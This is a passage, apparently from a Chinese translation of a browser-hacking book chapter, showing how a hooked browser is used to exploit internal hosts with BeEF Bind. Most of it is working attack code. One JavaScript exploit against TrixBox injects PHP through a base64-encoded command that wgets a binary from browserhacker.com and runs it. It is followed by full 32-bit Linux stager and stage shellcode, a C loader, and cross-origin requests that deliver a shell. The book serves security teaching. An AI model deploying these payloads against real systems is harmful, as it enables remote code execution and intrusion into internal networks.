
```javascript
// BeEF bind Stage

var stage = "\xfc\xe8\x89[...snip...]";

setTimeout(function(){

  xhr.abort();

  setTimeout(function(){

    // 等待几秒以让 Stager 进入内存，然后
    // 在默认 BeEF Bind 端口 4444 上发送 Stage。
    var stage_request = "cmd=" + stage;
    sendRequest(4444, stage_request);

  }, 4000);

}, 2000);
```

发送 Stager 和 Stage 之后，你就可以与在受害系统上运行的 BeEF Bind 监听器进行通信。Figure 10-29 展示了通过 BeEF Bind 执行 netstat 命令的过程。

start figure

**Figure 10-29:** 使用 BeEF Bind 与受 compromised 系统交互

![c10f029.tif](img/c10f029.png)

end figure

为简化过程，我们想使用 BeEF 的 `beef_bind_shell` 命令模块来与 Shellcode 通信。Figure 10-30 的图表提供了此攻击的高层次概览以及它如何基于前文的 IPE 攻击。你可以清楚地看到，双向通信通道完全通过浏览器传递，并且位于被钩钉浏览器的内部网络内部。

start figure

**Figure 10-30:** ActiveFax 利用 BeEF Bind Shellcode 的高层次概览

![c10f030.tif](img/c10f030.png)

end figure

使用 BeEF Bind 的主要优势在于消除了对出站通信通道的猜测。你不需要预测出站开放端口，也不必使用 HTTP 或 DNS 隧道突破网络限制。你利用浏览器已经存在的通信通道，这最终提高了利用成功率。

此攻击突显了浏览器作为跳板的概念。如果你钩钉了浏览器，你就拥有了内部网络的视野。所有从被钩钉浏览器可达的内部网络系统都在那里闲置，等待被利用。那么，为什么不使用浏览器作为跳点来发送你的攻击呢？

### TrixBox Inter-protocol Exploitation Example

正如第 9 章所揭示的，TrixBox 的一个版本存在远程命令执行漏洞。前一章通过执行反向网络连接演示了该漏洞。通过 BeEF Bind 扩展此攻击，展示了如何通过被钩钉的浏览器将反向连接通道化，从而绕过潜在的防御或预防控制。

TrixBox 默认在 CentOS Linux 上运行，且其 iptables 配置默认不阻止任何入站或出站网络流量，这使其成为 BeEF Bind 的理想目标。

下面的代码被注入到受害浏览器中，利用之前讨论的相同 TrixBox 漏洞。此次，它会在目标上运行 BeEF Bind Stager 二进制文件：

```javascript
var uri = "http://172.16.37.155/user/index.php";

/* 要与 PHP exec 执行的命令
 * 1. 获取 BeEF Bind 32 位 ELF
 * 2. 将二进制标记为可执行
 * 3. 在后台运行它
*/

var cmd = btoa("/usr/bin/wget -O /tmp/BeEF_bind " + 
"http://browserhacker.com/BeEF_bind " + 
"&& /bin/chmod +x /tmp/BeEF_bind && " + 
"/tmp/BeEF_bind > /dev/null 2>&1 & echo $!");

// POST 主体。前面的命令从 Base64 解码后执行
var body = "langChoice=<?php exec(base64_decode('" + cmd + "'));?>%00";

var xhr = new XMLHttpRequest();
xhr.open("POST", uri, true);
xhr.setRequestHeader("Content-Type", 
 "application/x-www-form-urlencoded");
xhr.setRequestHeader('Accept','*/*');
xhr.setRequestHeader("Accept-Language", "en");
xhr.send(body);

console.log("Sending first request with RCE vector...");

function getCookie(name){
  name += '=';
  var parts = document.cookie.split(/;\s*/);
  for (var i = 0; i < parts.length; i++){
    var part = parts[i];
    if (part.indexOf(name) == 0)
      return part.substring(name.length)
  }
  return null;
}

function trigger(){
 // 当前会话 cookie
 var phpsessid = getCookie("PHPSESSID");
 console.log("Using PHPSESSID: " + phpsessid);
 // 触发代码执行需要评估 PHP 的 $_SESSION 的序列化内容
 var body = "langChoice=../../../../../../../../../../tmp/sess_"
 + phpsessid + "%00";
 var xhr_trigger = new XMLHttpRequest();
 xhr.open("POST", uri, true);
 xhr.setRequestHeader("Content-Type", 
  "application/x-www-form-urlencoded");
 xhr.setRequestHeader('Accept','*/*');
 xhr.setRequestHeader("Accept-Language", "en");
 xhr.send(body);
 console.log("Sending second to trigger RCE...\n" + 
 "BeEF Bind ELF should now be listening on port 4444.");
}

setTimeout(function(){trigger();}, 3000);
```

该漏洞利用下载 BeEF Bind 二进制文件，修改其权限使其可执行，并以后台方式运行该二进制文件。

在此实例中，BeEF Bind 是一个 32 位 Linux ELF 二进制文件，包含前文讨论的 BeEF Bind Stager 功能。你可以使用以下 C 代码编译 Shellcode 为二进制文件，但它也可从 [`browserhacker.com`](https://browserhacker.com) 下载：

```c
#include <stdio.h>
#include <sys/mman.h>
#include <string.h>
#include <stdlib.h>
# Compile with GCC on Linux as the following
# gcc -fno-stack-protector -z execstack -o BeEF_bind BeEF_bind.c

int (*sc)();
char shellcode[] = "\xfc\x31\xc0\x31\xd2\x6a\x01\x5b\x50\x40"+
"\x50\x40\x50\x89\xe1\x6a\x66\x58\xcd\x80\x89\xc6\x6a\x0e\x5b"+
"\x6a\x04\x54\x6a\x02\x6a\x01\x56\x89\xe1\x6a\x66\x58\xcd\x80"+
"\x6a\x02\x5b\x52\x68\x02\x00\x11\x5c\x89\xe1\x6a\x10\x51\x56"+
"\x89\xe1\x6a\x66\x58\xcd\x80\x43\x43\x53\x56\x89\xe1\x6a\x66"+
"\x58\xcd\x80\x43\x52\x52\x56\x89\xe1\x6a\x66\x58\xcd\x80\x96"+ 
"\x93\xb8\x06\x00\x00\x00\xcd\x80\x6a\x00\x68\xff\xff\xff\xff"+
"\x6a\x22\x6a\x07\x68\x00\x10\x00\x00\x6a\x00\x89\xe3\x6a\x5a"+
"\x58\xcd\x80\x89\xc7\x66\xba\x00\x10\x89\xf9\x89\xf3\x6a\x03"+
"\x58\xcd\x80\x6a\x06\x58\xcd\x80\x81\x3f\x63\x6d\x64\x3d\x74"+
"\x03\x47\xeb\xf5\x6a\x04\x58\x01\xc7\xff\xe7";

int main(int argc, char **argv) {
   char *ptr = mmap(0, sizeof(shellcode), 
    PROT_EXEC | PROT_WRITE | PROT_READ, MAP_ANON | MAP_PRIVATE,
    -1, 0);
   if (ptr == MAP_FAILED) {perror("mmap");exit(-1);}
   memcpy(ptr, shellcode, sizeof(shellcode));
   sc = (int(*)())ptr;
   (void)((void(*)())ptr)();
   printf("\n");
   return 0;
}
```

在此阶段，你应该已经拥有正在监听 TCP 端口 4444 的 BeEF Bind Stager，如 Figure 10-31 所示。

start figure

- Figure 10-31: BeEF Bind ELF Stager 运行在 4444 端口上

![c10f031.tif](img/c10f031.png)

end figure

现在，你已准备好发送 Stage 进行执行。你可以使用以下 JavaScript，即使跨源，因为 BeEF Bind 返回 `Access-Control-Allow-Origin` 头，其值为通配符：

```javascript
// BeEF Bind Linux_32bit Stage
var BeEF_Bind_Stage = 
"\xfc\x31\xd2\x6a\x02\x59\x52\x52\x89\xe3\x6a\x2a\x58"+
"\xcd\x80\x49\x67\xe3\x02\xeb\xf1\x31\xdb\x6a\x02\x58"+
"\xcd\x80\x3d\x00\x00\x00\x00\x0f\x84\xe4\x01\x00\x00"+
"\x8b\x5c\x24\x08\x6a\x06\x58\xcd\x80\x8b\x5c\x24\x04"+
"\x6a\x06\x58\xcd\x80\x8b\x1c\x24\x6a\x04\x59\x68\x00"+
"\x08\x00\x00\x5a\x6a\x37\x58\xcd\x80\x6a\x00\x68\xff"+
"\xff\xff\xff\x6a\x22\x6a\x07\x68\x00\x10\x00\x00\x68"+
"\x00\x00\x00\x00\x89\xe3\x6a\x5a\x58\xcd\x80\x89\xc7"+
"\x81\xc4\x18\x00\x00\x00\x31\xd2\x31\xc0\x6a\x01\x5b"+
"\x50\x40\x50\x40\x50\x89\xe1\x6a\x66\x58\xcd\x80\x89"+
"\xc6\x81\xc4\x0c\x00\x00\x00\x6a\x0e\x5b\x6a\x04\x54"+
"\x6a\x02\x6a\x01\x56\x89\xe1\x6a\x66\x58\xcd\x80\x81"+
"\xc4\x14\x00\x00\x00\x6a\x02\x5b\x52\x68\x02\x00\x11"+
"\x5c\x89\xe1\x6a\x10\x51\x56\x89\xe1\x6a\x66\x58\xcd"+
"\x80\x81\xc4\x14\x00\x00\x00\x43\x43\x53\x56\x89\xe1"+
"\x6a\x66\x58\xcd\x80\x81\xc4\x08\x00\x00\x00\x43\x52"+
"\x52\x56\x89\xe1\x6a\x66\x58\xcd\x80\x81\xc4\x0c\x00"+
"\x00\x00\x96\x93\xb8\x06\x00\x00\x00\xcd\x80\xb9\x00"+
"\x10\x00\x00\x49\x89\xfb\x01\xcb\xc6\x03\x00\xe3\x05"+
"\xe9\xf1\xff\xff\xff\x66\xba\x00\x04\x89\xf9\x89\xf3"+
"\x6a\x03\x58\xcd\x80\x57\x56\x89\xfb\xb9\x00\x04\x00"+
"\x00\x81\x3b\x63\x6d\x64\x3d\x74\x09\x43\x49\xe3\x3a"+
"\xe9\xef\xff\xff\xff\x89\xd9\x81\xc1\x03\x00\x00\x00"+
"\x8b\x5c\x24\x14\x41\x6a\x01\x5a\x6a\x04\x58\xcd\x80"+
"\x80\x39\x0a\x75\xf2\x68\x00\x00\x00\x00\x68\x01\x00"+
"\x00\x00\x89\xe3\x31\xc9\xb8\xa2\x00\x00\x00\xcd\x80"+
"\x81\xc4\x08\x00\x00\x00\xe8\x62\x00\x00\x00\x48\x54"+
"\x54\x50\x2f\x31\x2e\x31\x20\x32\x30\x30\x20\x4f\x4b"+
"\x0d\x0a\x43\x6f\x6e\x74\x65\x6e\x74\x2d\x54\x79\x70"+
"\x65\x3a\x20\x74\x65\x78\x74\x2f\x68\x74\x6d\x6c\x0d"+
"\x0a\x41\x63\x63\x65\x73\x73\x2d\x43\x6f\x6e\x74\x72"+
"\x6f\x6c\x2d\x41\x6c\x6c\x6f\x77\x2d\x4f\x72\x69\x67"+
"\x69\x6e\x3a\x20\x2a\x0d\x0a\x43\x6f\x6e\x74\x65\x6e"+
"\x74\x2d\x4c\x65\x6e\x67\x74\x68\x3a\x20\x33\x30\x34"+
"\x38\x0d\x0a\x0d\x0a\x5e\x81\xc7\x00\x04\x00\x00\xb9"+
"\x62\x00\x00\x00\xf3\xa4\x5f\x5e\x8b\x1c\x24\x89\xf1"+
"\x81\xc1\x00\x04\x00\x00\x81\xc1\x62\x00\x00\x00\x68"+
"\x86\x0b\x00\x00\x5a\x6a\x03\x58\xcd\x80\x89\xfb\x89"+
"\xf1\x81\xc1\x00\x04\x00\x00\xba\xe8\x0b\x00\x00\x6a"+
"\x04\x58\xcd\x80\x6a\x06\x58\xcd\x80\x89\xf7\xe9\x63"+
"\xe8\xfe\xff\xff\x8b\x5c\x24\x0c\x6a\x06\x58\xcd\x80"+
"\x31\xdb\x6a\x06\x58\xcd\x80\x8b\x5c\x24\x08\x6a\x29"+
"\x58\xcd\x80\x8b\x1c\x24\x6a\x06\x58\xcd\x80\x31\xdb"+
"\x43\x6a\x06\x58\xcd\x80\x8b\x5c\x24\x04\x6a\x29"+
"\x58\xcd\x80\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\xa4"+
"\xcd\x80\x31\xc0\x50\x50\x68\x2f\x2f\x73\x68\x68"+
"\x2f\x62\x69\x6e\x89\xe3\x6a\x0b\x58\xcd\x80";

var uri = "http://172.16.37.155:4444/"; 
xhr = new XMLHttpRequest(); 
xhr.open("POST", uri, true);
xhr.setRequestHeader("Content-Type", "text/plain");
xhr.setRequestHeader('Accept','*/*');
xhr.setRequestHeader("Accept-Language", "en");
xhr.sendAsBinary("cmd=" + BeEF_Bind_Stage);
```

这段代码向 BeEF Bind 监听器发送跨源 POST 请求，端口为 4444。`cmd` 参数的值是 Linux Stage，它会被加载到内存中，随后被执行并由初始 Stager 处理。Stage 发送后，你可以通过钩住的浏览器通过跨源方式执行操作系统命令。如图 Figure 10-32 所示，得益于 BeEF Bind CORS 头，你可以跨源获取命令执行结果。

start figure
